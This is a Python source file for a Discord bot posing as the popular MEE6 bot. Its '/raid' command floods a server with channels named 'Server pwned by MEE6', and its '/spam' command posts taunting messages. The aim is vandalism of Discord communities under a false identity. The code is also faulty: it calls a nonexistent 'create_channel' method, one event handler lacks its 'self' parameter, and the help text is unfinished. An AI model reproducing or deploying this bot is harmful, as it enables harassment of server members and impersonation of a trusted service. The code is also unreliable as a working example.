import discord
from discord import Webhook
import os
import requests
import aiohttp
import random

class mee6(discord.Client):
    async def on_ready(self):
        print("Ready!")
        

    async def on_member_join(member):
        print("joined: "+member.mention)



    async def on_message(self, message):
        if message.content.startswith('/raid'):
            currentguild = message.guild
            await message.delete()
            await self.create_channel(currentguild, 'Server pwned by MEE6 :)', type=discord.ChannelType.text)
            await self.create_channel(currentguild, 'Server pwned by MEE6 ;)', type=discord.ChannelType.text)
            await self.create_channel(currentguild, 'Server pwned by MEE6 .)', type=discord.ChannelType.text)
            
            
        if message.content.startswith('/spam'):
            await message.delete()
            await message.channel.send("Pwned by MEE6 :)")
            
            
        if message.content.startswith('/help'):
            await message.delete()
            await message.channel.send("""MEE6 commands help
- /help: get all commands
- /raid: create a lot of channels
- /spam <message>: spam a message in current channel
- /""")


intents = discord.Intents.default()
intents.message_content = True
client = mee6(intents=intents)


client.run(os.environ['DISCORD_TOKEN'])
